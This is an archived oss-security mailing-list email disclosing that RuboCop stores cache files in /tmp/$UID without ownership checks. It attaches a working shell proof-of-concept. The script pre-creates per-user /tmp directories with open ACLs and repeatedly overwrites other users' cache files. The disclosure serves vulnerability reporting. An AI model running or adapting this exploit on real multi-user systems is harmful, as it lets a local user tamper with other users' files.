X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1282" "Monday" "1" "May" "2017" "18:54:44" "+0200" "Jakub Wilk" "jwilk@jwilk.net" "<20170501165444.wiaxkiauxjbgd5cx@jwilk.net>" "42" "[oss-security] RuboCop: insecure use of /tmp" nil nil nil "5" "2017050116:54:44" "[oss-security] RuboCop: insecure use of /tmp" (number mark "U       jwilk@jwilk. May  1   42/1282  " thread-indent "\"[oss-security] RuboCop: insecure use of /tmp\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 5144 invoked by uid 550); 1 May 2017 16:55:01 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 4070 invoked from network); 1 May 2017 16:54:59 -0000
Date: Mon, 1 May 2017 18:54:44 +0200
From: Jakub Wilk <jwilk@jwilk.net>
To: oss-security@lists.openwall.com
Message-ID: <20170501165444.wiaxkiauxjbgd5cx@jwilk.net>
Mail-Followup-To: oss-security@lists.openwall.com
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="lf7omkptn62xpcbm"
Content-Disposition: inline
User-Agent: NeoMutt/20170306 (1.8.0)
X-Ovh-Tracer-Id: 7518759578641749926
X-VR-SPAMSTATE: OK
X-VR-SPAMSCORE: 0
X-VR-SPAMCAUSE: gggruggvucftvghtrhhoucdtuddrfeeliedrheeggddutdeiucetufdoteggodetrfdotffvucfrrhhofhhilhgvmecuqfggjfdpvefjgfevmfevgfenuceurghilhhouhhtmecufedttdenuc
Subject: [oss-security] RuboCop: insecure use of /tmp

--lf7omkptn62xpcbm
Content-Type: text/plain; charset=us-ascii; format=flowed
Content-Disposition: inline

RuboCop stores cache files in /tmp/$UID/rubocop_cache/.
There are no ownership checks, so a malicious local users could exploit this to 
tamper with cache files belonging to other users.

Upstream bug report:
https://github.com/bbatsov/rubocop/issues/4336

I've attached PoC exploit.

-- 
Jakub Wilk

--lf7omkptn62xpcbm
Content-Type: text/plain; charset=us-ascii
Content-Disposition: attachment; filename=rubocop-cache-exploit

#!/bin/sh
set -e -u
cd /tmp
uids=$(cut -d: -f3 /etc/passwd | sort -u)
mkdir -m 777 $uids || {
    printf '%s: Failed to pre-create some /tmp/$UID directories. Maybe try again after reboot?\n' "$0" >&2
    exit 1
}
setfacl -d -m "u:$USER:rwx" $uids || {
    printf '%s: This exploit requires ACLs to work. Sorry!\n' >&2
    exit 1
}
# Past this point, we have write permissions to all cache files.
# We can replace them with our own contents.
export json='[{"severity":"error","location":{"begin_pos":0,"end_pos":0},"message":"No, /tmp is not an appropriate location for cache","cop_name":"Syntax","status":"uncorrected"}]'
while true
do
    find $uids -type f -exec sh -c 'printf "%s" "$json" > "$1"' - {} \;
    sleep 1
done

--lf7omkptn62xpcbm--
